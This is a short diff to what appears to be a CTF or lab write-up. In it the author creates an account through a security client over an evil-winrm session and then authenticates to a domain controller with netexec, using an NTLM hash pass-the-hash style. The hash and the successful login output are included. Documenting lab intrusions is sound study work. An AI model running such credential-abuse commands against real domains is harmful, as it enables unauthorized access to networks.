@@ -819,6 +819,8 @@ Commands:
 evil-winrm-py PS C:\Program Files\SentinelSecurity.Client>
 ```
 
+# Account creation and compromise
+
 ```python
 evil-winrm-py PS C:\Program Files\SentinelSecurity.Client> .\SentinelSecurity.Client.exe create
 *****************************************************************
@@ -848,5 +850,8 @@ evil-winrm-py PS C:\Program Files\SentinelSecurity.Client>
 Ill create an account and see if its valid
 
 ```python
-
+nxc smb dc01.trask.hsm -u 'sentinel-5TainB' -H '1217D4374DAA2B125EBA231EF9945ACA' -k
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\sentinel-5TainB:1217D4374DAA2B125EBA231EF9945ACA
 ```
+
